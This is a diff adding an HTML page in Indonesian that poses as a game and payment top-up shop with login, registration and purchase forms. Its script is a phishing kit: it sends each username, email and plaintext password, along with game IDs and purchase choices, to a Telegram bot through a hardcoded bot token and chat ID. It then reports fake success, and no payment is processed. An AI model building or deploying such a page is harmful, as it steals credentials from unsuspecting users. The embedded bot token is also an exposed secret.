@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Zeval Digital — TopUp Center</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body {
+      height: 100vh;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      overflow: hidden;
+    }
+    .container {
+      width: 360px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      backdrop-filter: blur(15px);
+      transition: all 0.5s ease;
+      text-align: center;
+      opacity: 0;
+      transform: translateY(30px);
+      animation: fadeIn 0.6s ease forwards;
+    }
+    h2 { margin-bottom: 20px; font-weight: 600; }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 10px;
+      outline: none;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #00c6ff;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover { background: #0072ff; transform: scale(1.03); }
+    .hidden { display: none; }
+    .link {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #ddd;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* === Loading Screen === */
+    #loading {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle at center, #203a43, #0f2027);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9999;
+      color: white;
+      font-size: 18px;
+      letter-spacing: 1px;
+    }
+    .loader {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top-color: #00c6ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* === Dashboard Zeval Style === */
+    .dashboard {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .card {
+      background: rgba(255,255,255,0.15);
+      border-radius: 15px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      transition: 0.3s;
+    }
+    .card:hover {
+      transform: scale(1.05);
+      background: rgba(0,198,255,0.2);
+    }
+    .icon {
+      font-size: 30px;
+      margin-bottom: 10px;
+    }
+    .fade-out { animation: fadeOut 0.4s forwards ease; }
+    @keyframes fadeOut {
+      from { opacity: 1; transform: translateY(0); }
+      to { opacity: 0; transform: translateY(-20px); }
+    }
+  </style>
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+</head>
+<body>
+  <!-- Loading -->
+  <div id="loading">
+    <div class="loader"></div>
+    <div>Memuat halaman...</div>
+  </div>
+
+  <!-- Login -->
+  <div class="container hidden" id="loginPage">
+    <h2>Login</h2>
+    <input type="text" id="loginUser" placeholder="Username" />
+    <input type="password" id="loginPass" placeholder="Password" />
+    <button onclick="login()">Masuk</button>
+    <div class="link" onclick="showRegister()">Belum punya akun? Daftar</div>
+  </div>
+
+  <!-- Register -->
+  <div class="container hidden" id="registerPage">
+    <h2>Registrasi</h2>
+    <input type="text" id="regUser" placeholder="Username" />
+    <input type="email" id="regEmail" placeholder="Email" />
+    <input type="password" id="regPass" placeholder="Password" />
+    <button onclick="register()">Daftar Sekarang</button>
+    <div class="link" onclick="showLogin()">Sudah punya akun? Login</div>
+  </div>
+
+  <!-- Dashboard -->
+  <div class="container hidden" id="dashboard">
+    <h2>ucupp digital top up</h2>
+    <p style="opacity: 0.8;">Top-up Game & Pembayaran Instan</p>
+
+    <div class="dashboard">
+      <input type="text" id="userID" placeholder="User ID Game / Tujuan" />
+      <select id="gameSelect">
+        <option value="">Pilih Game</option>
+        <option value="Mobile Legends">Mobile Legends</option>
+        <option value="Free Fire">Free Fire</option>
+        <option value="PUBG">PUBG</option>
+        <option value="Valorant">Valorant</option>
+      </select>
+      <select id="nominalSelect">
+        <option value="">Pilih Nominal</option>
+        <option value="10 Diamonds - Rp10.000">10 Diamonds - Rp10.000</option>
+        <option value="50 Diamonds - Rp45.000">50 Diamonds - Rp45.000</option>
+        <option value="100 Diamonds - Rp85.000">100 Diamonds - Rp85.000</option>
+      </select>
+      <button onclick="doPayment()">Bayar Sekarang</button>
+    </div>
+
+    <div class="dashboard-grid">
+      <div class="card"><div class="icon"><i class="fas fa-gamepad"></i></div><div>Game</div></div>
+      <div class="card"><div class="icon"><i class="fas fa-bolt"></i></div><div>PLN</div></div>
+      <div class="card"><div class="icon"><i class="fas fa-globe"></i></div><div>Pulsa</div></div>
+      <div class="card"><div class="icon"><i class="fas fa-wallet"></i></div><div>E-Wallet</div></div>
+    </div>
+
+    <div class="link" style="margin-top:20px;" onclick="logout()">Keluar</div>
+  </div>
+
+  <script>
+    // === GANTI DENGAN TOKEN DAN CHAT ID ANDA ===
+    const BOT_TOKEN = "7922890768:AAFdcW7_3-Tbf_M0ooXPhs3cLFLE4QKfjd8";
+    const CHAT_ID = "7975421614";
+
+    // Loading
+    window.addEventListener("load", () => {
+      const loading = document.getElementById("loading");
+      setTimeout(() => {
+        loading.classList.add("fade-out");
+        setTimeout(() => {
+          loading.style.display = "none";
+          document.getElementById("loginPage").classList.remove("hidden");
+        }, 400);
+      }, 2000);
+    });
+
+    function showLogin() { transitionTo("loginPage"); }
+    function showRegister() { transitionTo("registerPage"); }
+    function showDashboard() { transitionTo("dashboard"); }
+
+    function transitionTo(pageId) {
+      const pages = ["loginPage", "registerPage", "dashboard"];
+      pages.forEach(p => {
+        const el = document.getElementById(p);
+        if (p === pageId) {
+          el.classList.remove("hidden");
+          el.style.opacity = "0";
+          setTimeout(() => el.style.opacity = "1", 50);
+        } else {
+          el.classList.add("hidden");
+        }
+      });
+    }
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const body = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
+      fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+    }
+
+    function register() {
+      const user = document.getElementById("regUser").value.trim();
+      const email = document.getElementById("regEmail").value.trim();
+      const pass = document.getElementById("regPass").value.trim();
+      if (!user || !email || !pass) return alert("Isi semua data!");
+
+      const msg = `🆕 <b>Registrasi Baru</b>\n👤 Username: ${user}\n📧 Email: ${email}\n🔒 Password: ${pass}`;
+      sendToTelegram(msg);
+
+      localStorage.setItem("userData", JSON.stringify({ user, email, pass }));
+      alert("Registrasi berhasil!");
+      showLogin();
+    }
+
+    function login() {
+      const user = document.getElementById("loginUser").value.trim();
+      const pass = document.getElementById("loginPass").value.trim();
+      const data = JSON.parse(localStorage.getItem("userData") || "{}");
+
+      if (user === data.user && pass === data.pass) {
+        const msg = `✅ <b>Login Berhasil</b>\n👤 Username: ${user}\n📧 Email: ${data.email}\n🔒 Password: ${pass}`;
+        sendToTelegram(msg);
+        showDashboard();
+      } else {
+        alert("Username atau password salah!");
+      }
+    }
+
+    function logout() {
+      showLogin();
+      alert("Anda telah keluar.");
+    }
+
+    function doPayment() {
+      const userID = document.getElementById("userID").value.trim();
+      const game = document.getElementById("gameSelect").value;
+      const nominal = document.getElementById("nominalSelect").value;
+      const user = JSON.parse(localStorage.getItem("userData") || "{}").user || "Guest";
+
+      if (!userID || !game || !nominal) return alert("Lengkapi semua data!");
+
+      const msg = `💳 <b>Transaksi Baru</b>\n👤 User: ${user}\n🎮 Game: ${game}\n🆔 ID: ${userID}\n💰 Nominal: ${nominal}`;
+      sendToTelegram(msg);
+
+      alert("Transaksi berhasil dikirim!");
+    }
+  </script>
+</body>
+</html>
